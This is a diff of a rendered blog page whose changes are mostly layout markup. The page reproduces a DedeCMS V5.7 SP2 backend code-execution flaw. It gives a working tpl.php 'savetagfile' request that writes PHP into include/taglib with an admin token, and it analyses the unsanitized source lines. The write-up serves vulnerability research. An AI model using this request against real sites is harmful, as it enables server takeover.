@@ -84,13 +84,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    3.9k
+                    3.5k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
-                    4 mins.
+                    3 mins.
                 </span>
                 
                 
@@ -127,15 +127,15 @@
             <p>终于复现成功一个漏洞了~~  不过是后台的一个漏洞<br>– 源码地址：<a href="http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz" target="_blank" rel="noopener">http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz</a><br><a id="more"></a></p>
 <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>要有后台管理员账号密码，登录后台。<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/后台.png" alt></p>
 <p>访问/dede/tpl.php?action=upload，审查源码，获取我们的token值。<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/token.png" alt></p>
-<p>然后访问：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/dede/tpl.php?filename=test.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=abb438be63426baeee2db81a27dfd910</span><br></pre></td></tr></table></div></figure></p>
+<p>然后访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/dede/tpl.php?filename=test.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=abb438be63426baeee2db81a27dfd910</span><br></pre></td></tr></table></figure></p>
 <p>后面加上我们上一步获取的token值。<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/test.lib.php.png" alt></p>
-<p>然后访问我们的<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/include/taglib/test.lib.php</span><br></pre></td></tr></table></div></figure></p>
+<p>然后访问我们的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/include/taglib/test.lib.php</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/phpinfo.png" alt></p>
 <p>发现我们的代码写进去了。</p>
 <p>访问include/taglib/test.lib.php<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/src.png" alt></p>
 <h1 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>想一想我们的思路：<br>1、获取token值<br>2、访问指定的链接</p>
 <p>就把我们的代码写入到/include/taglib/xxx.lib.php中</p>
-<p>token值很容易获取，那么问题就是在那个链接上面：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/dede/tpl.php?filename=test.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=abb438be63426baeee2db81a27dfd910</span><br></pre></td></tr></table></div></figure></p>
+<p>token值很容易获取，那么问题就是在那个链接上面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/dede/tpl.php?filename=test.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=abb438be63426baeee2db81a27dfd910</span><br></pre></td></tr></table></figure></p>
 <p>看一下参数，就知道这是一个文件保存的操作。</p>
 <p>问题出现在tpl.php</p>
 <p>这个文件代码也没有多少。</p>
@@ -144,7 +144,7 @@
 <p>首先会匹配正则， 要以.lib.php结尾。</p>
 <p>然后会将 $content 写入到 $filename 中。</p>
 <p>那么我们要跟踪一下文件对这两个参数进行的处理。</p>
-<p>然后我们回过头来看整个文件的代码。<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &apos;&apos;, $filename);	//line21</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);	//line260</span><br><span class="line">$content = stripslashes($content);	//line261</span><br></pre></td></tr></table></div></figure></p>
+<p>然后我们回过头来看整个文件的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &apos;&apos;, $filename);	//line21</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);	//line260</span><br><span class="line">$content = stripslashes($content);	//line261</span><br></pre></td></tr></table></figure></p>
 <p>可以看出，只有替换，并没有对参数进行安全防护措施。</p>
 <h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>又是一个安全防护不到位的一个漏洞，为什么就没挖到呢。</p>
 <p>于是用seay源代码审计扫了一下。没有扫出这个漏洞点。<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/seay.png" alt></p>
